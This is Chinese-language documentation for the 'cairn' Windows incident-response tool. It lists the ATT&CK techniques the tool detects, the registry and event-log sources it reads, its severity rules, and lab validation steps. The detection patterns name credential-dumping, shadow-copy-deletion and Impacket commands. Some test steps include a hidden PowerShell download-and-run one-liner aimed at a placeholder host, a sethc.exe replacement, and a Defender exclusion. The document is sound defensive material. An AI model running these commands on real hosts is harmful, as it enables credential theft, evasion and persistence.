# 偵測覆蓋範圍與驗證方式

`cairn coverage` 會列出這個版本能偵測的 MITRE ATT&CK 技術：內建啟發式（heuristics）一張表，再加上已載入 Sigma 規則的技術標籤統計。**掃描結果乾淨，只代表表上這些技術沒被看到，不代表主機沒事。**

## 持久化：檢查哪些位置

| 技術 | 名稱 | 檢查位置 | 判斷方式 |
|---|---|---|---|
| T1547.001 | Run Keys / Startup | HKLM/HKCU Run、RunOnce（含 WOW6432Node）、Policies\Explorer\Run、Startup 資料夾、BootExecute | Run／Startup：只看路徑和簽章；Policies Run：有項目就報；BootExecute：非 `autocheck autochk` 就報 |
| T1543.003 | Windows Service | Services 中自動啟動的 ImagePath | 只看路徑和簽章 |
| T1053.005 | Scheduled Task | `System32\Tasks` XML | 只看路徑和簽章，加上腳本內容 |
| T1546.003 | WMI Event Subscription | `root\subscription` binding | 一律報；內嵌腳本含動態執行或網址時升為 High |
| T1546.008 | Accessibility Features | IFEO Debugger 指向 sethc／utilman／osk／magnify／narrator 等 | 一律報 High |
| T1546.012 | IFEO Injection | IFEO Debugger、SilentProcessExit MonitorProcess | 一律報 |
| T1546.002 | Screensaver | HKCU `SCRNSAVE.EXE` | 只看路徑和簽章 |
| T1546.007 | Netsh Helper DLL | HKLM\SOFTWARE\Microsoft\NetSh | 不在預設清單，或不在 Windows 目錄下就報 |
| T1546.009 | AppCert DLLs | Session Manager\AppCertDlls | 有項目就報 |
| T1546.010 | AppInit DLLs | AppInit_DLLs（32/64 位元） | 有項目就報 |
| T1546.013 | PowerShell Profile | 所有使用者與目前使用者的 profile.ps1 | 內容含下載或編碼語法（DownloadString、IEX、FromBase64String、-enc、網址）就報 |
| T1546.015 | COM Hijacking | HKCU CLSID\*\InprocServer32 | 只看路徑和簽章 |
| T1546 | cmd AutoRun | Command Processor AutoRun（HKLM/HKCU） | 有項目就報 |
| T1547.002 | Authentication Package | LSA Authentication Packages | 非預設（msv1_0）就報 |
| T1547.003 | Time Providers | W32Time TimeProviders DllName | 不在預設清單，或不在 Windows 目錄下就報 |
| T1547.004 | Winlogon Helper | Winlogon Shell／Userinit／Notify／MPNotify | Shell／Userinit 非預設值就報；MPNotify 有項目就報 |
| T1547.005 | Security Support Provider | LSA Security Packages（含 OSConfig） | 非預設套件就報（例如 mimilib） |
| T1547.010 | Port Monitors | Print\Monitors Driver | 不在預設清單，或不在 Windows 目錄下就報 |
| T1547.014 | Active Setup | Installed Components StubPath | 只看路徑和簽章 |
| T1556.002 | Password Filter DLL | LSA Notification Packages | 非預設（scecli、rassfm）就報 |
| T1137.002 | Office Test | Office test\Special\Perf | 有項目就報 |
| T1037.001 | Logon Script | HKCU\Environment UserInitMprLogonScript | 有項目就報 |

「只看路徑和簽章」是指 persist heuristic 的通用訊號，一律看「實際被執行的程式」：未簽章且位於使用者可寫入路徑（High）、系統程式名稱不在它應有的目錄（例如 `C:\Windows\Temp\svchost.exe`，High）、近期修改且未簽章或簽章無法驗證（Medium）。Startup 資料夾不再例外：捷徑（.lnk）本身的位置不列入判斷，但解析出的目標程式、直接放在資料夾裡的執行檔都照樣判斷；直接放進 Startup 資料夾的腳本檔（.vbs、.js、.bat、.ps1、.hta 等）報 Medium。

代理執行（T1218 / T1059）：持久化項目指向 rundll32、regsvr32、msiexec、mshta、wscript、cscript、powershell、cmd 這些已簽章的系統程式時，改看它的參數——參數是放在使用者可寫入路徑的 DLL／腳本、網路芳鄰路徑（`\\host\share`）或網址，報 High。

服務的啟動類型：手動啟動（Start=3）的服務若只有一個訊號，嚴重度降一級（需要 collector 記錄啟動類型；目前尚未記錄，所以暫不生效）。

嚴重度規則：有項目或非預設項目一律先算 Medium；目標未簽章、位於使用者可寫入路徑或偽裝成系統程式時升為 High。同一筆有兩個以上訊號，或對應的程式正在執行、留有執行紀錄時，會再升一級。

## 事件記錄：內建偵測（不需要 Sigma 規則）

這些事件 Windows 預設就會寫入，不需要安裝 Sysmon；即使 `rules\sigma` 不在，也會讀取 Security、System、Application、Defender Operational、TerminalServices-RemoteConnectionManager／LocalSessionManager Operational 和 WMI-Activity Operational 這些記錄（後面幾節的遠端桌面、WMI、VSS 偵測要用）；有裝 Sysmon 的主機也會讀 Sysmon Operational（行程建立事件 1 要給父子行程與命令列偵測用）。

| 技術 | 事件 | 判斷方式 |
|---|---|---|
| T1070.001 | Security 1102、System 104（記錄被清除） | 一律報 High |
| T1543.003 | System 7045（新安裝服務） | 指令在使用者可寫入路徑、呼叫 cmd／powershell／mshta 等，或含下載／編碼語法：High；exe 直接放在 Windows 資料夾根目錄（`%SYSTEMROOT%\x.exe`，也就是 `ADMIN$` 共用的根目錄，Metasploit psexec 等工具放服務程式的位置）或不在 Windows／Program Files 下：Medium；其他（System32 等子資料夾、Program Files）：Low |
| T1562.002 | System 7040（Windows Event Log 服務被設為停用，`param4` 為 `EventLog`、`param3` 為停用） | 一律報 High；改回自動啟動不報 |
| T1053.005 | Security 4698（新建排程工作，需開啟「其他物件存取」稽核） | 同上，看 TaskContent 裡的 Command 和 Arguments |
| T1562.001 | Defender 5001（即時保護被關閉）、5007（新增排除項目） | 一律報 High |
| — | Defender 1116（偵測到惡意程式）、1117（已處理）、1118／1119（處理失敗） | 依威脅名稱與路徑合併成一筆，附上 Defender 的處理結果。處理失敗：High；PUA／廣告軟體：已處理 Low、未見處理 Medium；其他類別：High |

真實記錄驗證：`tests/fixtures/` 收了 29 個公開的攻擊樣本記錄檔（EVTX-ATTACK-SAMPLES、DeepBlueCLI，GPL-3.0，來源見該目錄的 README），`cairn-cli` 的 `real_evtx` 測試用 `cairn evtx` 的同一套流程跑過每個檔案，檢查該出現的 finding（分析器、嚴重度、技術）和不該出現的誤報。事件時間取自事件本身的 TimeCreated（匯出的記錄檔，檔頭時間可能是 0 或晚好幾天）；帶 Qualifiers 的 EventID（7036／7040／7045 等服務控制管理員事件）也照常讀取。尚未有真實樣本驗證的：Defender 1116–1119／5001／5007、TerminalServices-LocalSessionManager 21／24／25、Security 4778、VSS 相關的 7036／7040／524／8193（7036／7040 的欄位格式已用其他服務的真實事件確認）。PowerShell 4104 的欄位（ScriptBlockText 等）已在 DeepBlueCLI 樣本上確認，但檔案太大未收入。Sysmon 1（Image、CommandLine、ParentImage、ParentCommandLine、User、OriginalFileName、Hashes）、Sysmon 10（SourceImage、TargetImage、GrantedAccess、CallTrace）、Sysmon 19／20／21（Operation、Name、Type、Destination、Consumer、Filter）以及 Windows 7 的 4688（沒有 ParentProcessName、也沒有命令列）都已用真實樣本確認。

## 初始入侵：ClickFix（T1204.004）

假驗證碼、假錯誤頁面會要求使用者按 Win+R 貼上指令。Explorer 會把「執行」對話框輸入過的內容存在 `HKU\<SID>\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU`。cairn 會讀所有已登入使用者的這個機碼：呼叫 powershell、mshta、cmd、curl 等並帶參數的報 Medium；同時含下載、編碼、網址或隱藏視窗的報 High。單純的 `cmd`、`notepad`、網路路徑不報。

FileFix 是同一招的變形：假的文件分享頁面要使用者把「檔案路徑」貼到檔案總管的網址列，實際上是一串指令。Explorer 把網址列輸入過的內容存在 `...\Explorer\TypedPaths`，cairn 用同樣的規則判斷。另外，行程上 explorer.exe 直接啟動 mshta.exe 也報 High。

時間：RunMRU／TypedPaths 整個機碼只有一個最後寫入時間，只代表「最近一筆」的輸入時間。其他筆的 finding 時間是收集時間，`reason` 會寫「time unknown」。

驗證：在 VM 上按 Win+R 輸入 `powershell -w h -c "iwr http://example.invalid/a.ps1 | iex"`（網址不存在，不會真的下載），再執行 cairn，應該看到一筆 High 的 T1204.004。

## 防禦狀態與遠端控制工具（posture collector，phase 3E）

`posture` collector 只讀取登錄檔與檔案，不修改主機：Defender 設定與排除清單、稽核原則（`AuditQuerySystemPolicy`，需要時在 cairn 自己的 token 啟用 SeSecurityPrivilege，不會設定任何稽核原則）、4688 命令列與 PowerShell 記錄原則、Sysmon、TaskCache 排程工作樹、System32 協助工具程式、Program Files／ProgramData／各使用者 AppData 下的程式資料夾。讀不到的位置會寫進 manifest 的 source errors，不會當成「沒有」。

| 技術 | 檢查內容 | 判斷方式 |
|---|---|---|
| T1562.001 | Defender 排除項目（`Windows Defender\Exclusions` 與 `Policies\...\Exclusions` 的 Paths／Extensions／Processes／IpAddresses） | 排除整個磁碟、`\Users`、使用者可寫入資料夾、執行檔或腳本副檔名、cmd／PowerShell／mshta 等直譯器：High；其他排除項目：Medium。排除清單讀不到（新版 Windows 連管理員都可能被拒）會另外列一筆 observation，不當成沒有排除項目 |
| T1562.001 | Defender 原則 `DisableAntiSpyware`、`DisableRealtimeMonitoring`、`DisableBehaviorMonitoring` | 值為 1：High |
| T1562.001 | `Windows Defender\Features\TamperProtection` | 不是 5（防竄改保護未開啟）：Medium，屬於設定弱點，不代表已被入侵 |
| T1053.005 | `Schedule\TaskCache\Tree` 底下的排程工作 | 缺少 `SD` 值（Tarrask 手法，工作排程器看不到），或 `System32\Tasks` 沒有對應檔案：High |
| T1546.008 | System32 的 sethc／utilman／osk／magnify／narrator／displayswitch／atbroker | 版本資訊 OriginalFilename 是 cmd、PowerShell 或 explorer，或檔案未簽章：High；OriginalFilename 和預期不符：Medium（簽章有效時 Low） |
| T1219 | 遠端控制工具：AnyDesk、ScreenConnect、TeamViewer、Atera、Splashtop、NetSupport、RustDesk、Supremo、LogMeIn、GoTo／LogMeIn Rescue、Action1、MeshAgent、ngrok、cloudflared、Tailscale、ZeroTier、Radmin、UltraVNC／TightVNC／RealVNC、Chrome Remote Desktop、Level、SimpleHelp、Tactical RMM（行程、服務、安裝資料夾） | 只是存在：Low，說明會請你確認是否經過核准；安裝資料夾或服務機碼 30 天內有變動：Medium；從使用者可寫入路徑執行、未簽章、改名（簽章是該工具但檔名不是，或檔名是該工具但簽章是別人）、或有連往公網 IP 的連線：High。同一台主機有兩種以上：另報一筆 Medium。工具自己的記錄檔（見下方「遠端控制工具自己的記錄檔」）在收集期間內有外部連入：至少 Medium |

記錄缺口（不是偵測）：「稽核處理程序建立」沒開、4688 沒有命令列、登入／排程工作／帳號／群組變更沒有稽核、PowerShell 4104 沒開、沒有 Sysmon，會各列一筆 observation（`logging_posture`）。沒開的記錄，對應的 Sigma 規則和事件記錄偵測就不可能命中；讀不到的設定會寫「無法確認」，不要假設它有開。

驗證：在 VM 上 `Add-MpPreference -ExclusionPath C:\Users\Public`、`copy C:\Windows\System32\cmd.exe` 蓋過 sethc.exe（先取得檔案擁有權）、安裝 AnyDesk，再執行 cairn，應分別看到 T1562.001、T1546.008（High）和 T1219。

## 橫向移動、竊取帳密、勒索前置動作

- 橫向移動（`heur_lateral`，只看事件記錄，離線 `cairn evtx` 也會跑）：遠端位址存取 `ADMIN$` 或磁碟共用 `C$`（Security 5140／5145，需開啟「檔案共用」稽核），同一來源和帳號合併成一筆，Medium（T1021.002）；之後 10 分鐘內有新服務安裝（System 7045）升為 High（加上 T1569.002）。7045 的服務名稱或 ImagePath 是 PSEXESVC、指到 `ADMIN$`／`\\127.0.0.1\`、是 `%COMSPEC%`／`cmd.exe /c` 單行指令（smbexec），或 exe 直接放在 Windows 資料夾根目錄（Metasploit psexec 的 `%SYSTEMROOT%\<亂數>.exe`、PAExec、RemCom）報 High，並寫出前 10 分鐘內的網路登入（4624 type 3）或共用存取來源。4624 type 9（`seclogo`，runas /netonly 和 pass-the-hash 都長這樣）只報 Low（T1550.002），當作其他 finding 的背景。
- 遠端桌面（`heur_lateral`，T1021.001）：Security 4624 type 10、帶遠端位址的 type 7、4778（重新連線，需開啟「其他登入／登出事件」稽核，預設沒開），TerminalServices-RemoteConnectionManager 1149（RDP 驗證成功，含來源 IP），TerminalServices-LocalSessionManager 21／24／25（登入、中斷、重新連線，含來源位址），同一來源位址和帳號合併成一筆。來源是公網 IP：High；4624 type 10 來自本機（127.0.0.1／::1），或 LocalSessionManager 位址帶 `%16777216`（ngrok 之類通道轉送的特徵）：High；私有 IP：Low，當作背景，同一來源對這個帳號也有 4625 登入失敗，或這是該帳號在收集期間內第一次登入（而且 Security 記錄至少涵蓋之前 24 小時）時升為 Medium。`LOCAL`（主控台）、本機、空白來源不報。
- 以其他帳號的密碼連到其他主機（`heur_lateral`，T1021／T1550）：Security 4648 的 TargetServerName 不是 localhost、不是這台電腦，而且目標帳號和執行者不同，依（執行者、主機、程式）合併，列出用到的目標帳號，Medium；reason 會寫出程式、目標主機和帳號。真實記錄顯示，用 SMB 連到遠端 IP（`net use \\10.0.0.5 /user:...`）時，TargetServerName 會寫成這台電腦自己的名稱，遠端位址只出現在 IpAddress（port 445、程式名稱空白、PID 4），所以 TargetServerName 是本機但 IpAddress 是遠端位址時，以該位址為目標（執行者是電腦帳號的不算，那是 winlogon 處理連入登入）。同一組用了 5 個以上不同帳號：一筆 High，加上 T1110.003（透過 SMB 的密碼噴灑）。同一帳號（lsass／svchost 用自己的憑證）和電腦帳號對電腦帳號不報。
- WMI-Activity Operational（`heur_lateral`）：5861 綁定永久事件訂閱（T1546.003），consumer 是 CommandLineEventConsumer 或 ActiveScriptEventConsumer：High，其他類型：Medium，Windows 內建的 BVTConsumer、SCM Event Log Consumer 不報。5860 建立暫時事件訂閱（T1047）：Medium，系統帳號（SYSTEM、LOCAL SERVICE、NETWORK SERVICE）從本機建立的不報（大多是監控或管理代理程式）；ClientMachine 是 NetBIOS 名稱，主機名稱超過 15 個字元時會被截斷，比對本機時也照這個規則截斷。5857 載入 WMI provider（T1047）：只有 DLL 在使用者可寫入路徑時報 Medium。
- 竊取帳密（`heur_cred_dump`）：`dropscan` 只列出放置區（每位使用者的 Desktop、Downloads、`AppData\Local\Temp`，`C:\Windows\Temp`、`C:\Users\Public`、`C:\ProgramData` 根目錄、`C:\PerfLogs`）中 `--since` 期間內建立或修改的 dmp／mdmp／bin／zip／7z／rar 檔，只讀檔案資訊和前 8 個位元組，最多 3 層、5000 筆，不跟隨連結，絕不開啟 LSASS。有 `MDMP` 簽章且檔名含 lsass：High；有簽章但檔名不含：Medium；檔名像 lsass 傾印但沒有簽章：Medium（T1003.001）。`HKLM\SOFTWARE\Microsoft\Windows\Windows Error Reporting\LocalDumps\lsass.exe` 存在：High。行程、4688 與 Sysmon 1 命令列含 comsvcs.dll MiniDump、ProcDump lsass、Mimikatz 模組、Out-Minidump（T1003.001）、`reg save HKLM\SAM／SECURITY`（T1003.002）、ntdsutil IFM 或複製 ntds.dit（T1003.003）：High。
- 勒索前置動作（`heur_ransom`，T1490）：行程、4688 與 Sysmon 1 命令列含 `vssadmin delete shadows`／`resize shadowstorage`、`wmic shadowcopy delete`、以 WMI／PowerShell 刪除 `Win32_ShadowCopy`、`wbadmin delete catalog／systemstatebackup／backup`、`bcdedit` 關閉復原或忽略開機失敗：High。用戶端版本、系統還原已開啟、但 `Win32_ShadowCopy` 為 0 個：Medium（剛重灌或清理工具也會這樣，reason 會註明）；三項任一讀不到就不報。另外讀取 Windows 預設就會寫的 VSS／備份事件：Application 524（`Microsoft-Windows-Backup`，備份目錄被刪除）、System 7040（「磁碟區陰影複製」服務被設為停用）、System 7036（VSS 服務啟動／停止）、Application `VSS` 8193／8194／12289 錯誤。刪除指令前後 30 分鐘內的這些事件會附在那筆 High 上當證據，reason 也會寫出來；附近沒有刪除指令時，524 和 7040 停用各報一筆 Medium（4688 沒開命令列時看不到指令，IT 整理備份也會這樣），7036 和 VSS 錯誤單獨出現不報（VSS 每次閒置都會停止，健康的主機也常有寫入程式錯誤）。
- 遠端控制工具自己的記錄檔（`dropscan` 收集、`heur_rmm` 判斷，T1219）：只讀取檔案資訊，不修改。AnyDesk 的 `ad.trace`、`ad_svc.trace`、`connection_trace.txt`（`C:\ProgramData\AnyDesk` 和每位使用者的 `AppData\Roaming\AnyDesk`）；TeamViewer 的 `Connections_incoming.txt` 和 `TeamViewer*_Logfile.log`（Program Files 下的 TeamViewer 資料夾，以及每位使用者的 `AppData\Roaming\TeamViewer`）；ScreenConnect／ConnectWise Control 用戶端資料夾裡的 `*.log`。`connection_trace.txt` 和 `Connections_incoming.txt` 是簡單的文字格式，會解析 `--since` 期間內的外部連入（時間、對方 ID、本機帳號），每個檔案只讀最後 2 MB、最多保留最新 500 筆，讀到上限會寫進 manifest。有外部連入時，該工具的 finding 至少是 Medium，連入紀錄附為證據（最多 20 筆）；其他記錄檔只代表工具存在。這兩種格式和時區（當成 UTC）來自公開的鑑識文章，尚未在真機上驗證。

驗證：在 VM 上執行 `vssadmin list shadows` 不應有 finding；執行 `cmd /c echo vssadmin delete shadows /all /quiet` 不會刪除任何東西，但 4688 有命令列時會出現一筆 High 的 T1490（含 `vssadmin delete shadows` 字樣）。不要在客戶主機上執行真正的刪除指令。

遠端桌面與 WMI 的驗證：在 VM 上從另一台電腦用遠端桌面登入，應看到一筆 T1021.001（私有 IP 為 Low，先故意輸錯一次密碼再登入則為 Medium）；執行 `net use \\<另一台電腦>\IPC$ /user:<其他帳號> *` 會產生 4648，應看到一筆 Medium 的 T1021；用 Atomic Red Team T1546.003 建立 CommandLineEventConsumer，應看到 5861 的 High（`heur_persist` 也會從 `root\subscription` 報一筆）。安裝 AnyDesk 並從另一台電腦連入一次，再執行 cairn，AnyDesk 的 finding 應為 Medium 並附上這次連入。

## 每位使用者的位置

Run／RunOnce、COM 劫持、登入腳本、螢幕保護程式、cmd AutoRun、RunMRU 會讀 `HKEY_USERS` 底下每個已載入的使用者，不只是執行 cairn 的那個帳號；Startup 資料夾和 PowerShell profile 會檢查 `C:\Users` 下每個使用者。所以資訊人員用自己的管理員帳號提權執行時，也看得到受害使用者的項目（前提是該使用者目前已登入，或其登錄檔已載入）。

## 其他內建偵測

- 行程（父→子，`heur_parentchild`）：同一套規則同時套用在執行中的行程和事件記錄裡的行程建立（Security 4688、Sysmon 1），所以離線 `cairn evtx` 也會跑。同一個行程在兩邊都有紀錄時只報一次（執行中的行程優先；4688 和 Sysmon 1 是同一次啟動時留 Sysmon）；Windows 7 的 4688 沒有父程序名稱，改用建立者 PID 找這次記錄中較早啟動的父程序。Office（Word、Excel、PowerPoint、Outlook、OneNote、Access、Publisher、Visio）或腳本宿主產生 shell（T1059）、編碼或下載型 PowerShell（T1059.001）、LOLBin 帶可疑參數（T1218）；explorer.exe → mshta.exe（ClickFix，T1204.004，High）；w3wp／sqlservr／httpd／nginx／Tomcat → cmd／powershell／whoami（web shell，T1505.003，High）；wmiprvse.exe → cmd／powershell（T1047，Medium；輸出寫到 `\\127.0.0.1\ADMIN$` 的 wmiexec 特徵升為 Critical）；wmiprvse.exe → 其他程式（例如 calc、rundll32、explorer，T1047，Medium；WerFault、wmiadap、`msiexec /i`、Program Files 與 `C:\Windows\CCM` 下的廠商或 SCCM 程式不報）；services.exe → 寫到 `\\127.0.0.1\ADMIN$` 的 cmd.exe 或 PSEXESVC（T1569.002，High）；services.exe → PowerShell，或啟動 PowerShell 的 cmd（Metasploit psexec_psh 這類服務型 PowerShell，T1569.002／T1059.001，隱藏視窗／`-nop`／編碼時 High，否則 Medium）。不論父程序是誰，命令列把輸出導到 `\\127.0.0.1\ADMIN$\__<時間>` 或 `\\127.0.0.1\C$\__output`（Impacket wmiexec／dcomexec／smbexec）就報 High（T1047、T1021.002）。Sysmon 1 的 OriginalFileName 是 cmd、PowerShell、rundll32 等程式，檔名卻不同：改名的系統工具，High（T1036.003）。系統程式名稱（svchost、lsass、csrss、services、winlogon、explorer、rundll32、dllhost、taskhostw 等）不在應有目錄就報 High（T1036.005），即使在 `C:\Windows` 底下也一樣。每種組合都有自己的說明文字，不再用籠統的「可能為偽裝或橫向移動」。
- 網路：連線所屬程式未簽章且位於可疑路徑（T1036），單獨出現報 Medium，再加上其他訊號（少見埠、監聽高埠、該程式有持久化項目）升為 High 以上；公網 IP 連進本機 RDP（3389）、SMB（445）、SSH（22）的連線報 High（T1021.001／.002／.004、T1133）。
- 帳號（Security 記錄）：建立帳號（T1136.001）、刪除帳號（T1531）；加入群組（4728／4732／4756，T1098.007）——Administrators、Domain Admins、Enterprise Admins、Remote Desktop Users、Backup Operators 報 High，其他群組 Low，說明會寫出「誰把誰加進哪個群組」，已被 Sigma 規則報過的同一筆事件不重複；帳號啟用（4722）、被其他帳號重設密碼（4724）、帳號安全旗標被打開（4738：不需要密碼、密碼永不過期、可逆加密、委派、不需 Kerberos 預先驗證等）報 Medium（T1098）。
- 密碼猜測與噴灑（T1110.001／T1110.003）：只算 4625（以及 4768、4771、4776）中真正屬於猜錯的失敗——密碼錯誤、帳號不存在、帳號被鎖定（網域控制站上猜不存在的帳號記成 4768 Status 0x6，猜錯既有帳號的密碼才是 4771 Status 0x18，兩種都算；4768 成功不算）；不算服務／批次登入（LogonType 0／4／5）、本機來源（`-`、127.0.0.1、::1）、DWM-／UMFD- 帳號。「猜中」要在失敗之後，同一來源出現 4624 網路（type 3）或遠端桌面（type 10）登入成功。
- Sigma：96 條規則，前提是對應的記錄有開啟（Sysmon、4688 含命令列、PowerShell 4104）；每次執行的報告會列出哪些規則在這台主機能觸發。其中 9 條只有裝 Sysmon 才可能觸發：存取 LSASS 記憶體（Sysmon 10：可疑權限遮罩、comsvcs、檔名含 dump、mimikatz 等駭客工具，T1003.001）與 WMI 永久事件訂閱（Sysmon 19／20／21，T1546.003，consumer 內含下載或編碼內容時 High）。Impacket 橫向移動與 WmiPrvSE 可疑子行程兩條在 4688（Windows 10 以後有父程序名稱）或 Sysmon 1 都能跑。實際各技術的規則數請看 `cairn coverage`。

## 怎麼驗證（在實驗用 VM 上，不要在客戶主機上）

1. 準備一台已建立快照的 Windows 10/11 VM，安裝 [Atomic Red Team](https://github.com/redcanaryco/invoke-atomicredteam)。
2. 對要驗證的技術列出測試內容：`Invoke-AtomicTest T1547.005 -ShowDetailsBrief`，先看懂這個測試會改什麼。
3. 執行測試：`Invoke-AtomicTest T1547.005 -TestNumbers 1`。
4. 以管理員身分執行 `cairn run --target live --output C:\IR\t1547005`，確認 `findings.jsonl` 有一筆 `mitre` 含 `T1547.005` 的 finding，`reason` 也說明了原因。
5. 清除測試：`Invoke-AtomicTest T1547.005 -TestNumbers 1 -Cleanup`，或直接還原快照。

建議每次發版前，至少對上表每個技術各跑一個 Atomic 測試，並把「技術、測試編號、是否命中」記錄下來。這就是這個工具可以被驗證的方式：每一列都要能在 VM 上重現。

單元測試則用假的 registry（`cairn-collectors::asep` 的 `RegRead`）驗證每個位置的讀取邏輯，用 `cairn-heur::asep` 的測試驗證預設清單與嚴重度。這兩層都不需要 Windows 就能跑。
